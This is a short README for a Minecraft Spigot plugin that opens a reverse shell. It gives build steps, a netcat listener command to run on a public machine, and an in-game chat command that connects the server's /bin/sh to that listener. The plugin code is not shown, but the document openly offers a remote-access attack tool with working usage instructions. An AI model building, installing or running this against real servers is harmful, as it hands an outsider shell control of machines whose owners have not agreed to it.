# shell-plugin

a reverse shell spigot plugin.

### requirements

- a minecraft server
- maven and openjdk >=18

You can now build the jar.

```shell
cd ./reverse-shell
mvn package
```

You can find the plugin jar at `./reverse-shell/target/hut-1.0.0.jar`.

Once you have installed the plugin, create a netcat server on a **publicly-accessible** linux machine.

```
nc -l 0.0.0.0 6969
```

Simply enter `/reverse-shell your.server.ip 6969 /bin/sh` in the minecraft chat and it will attempt to create a reverse shell.
Then you can type commands like `ls` into the netcat server prompt.
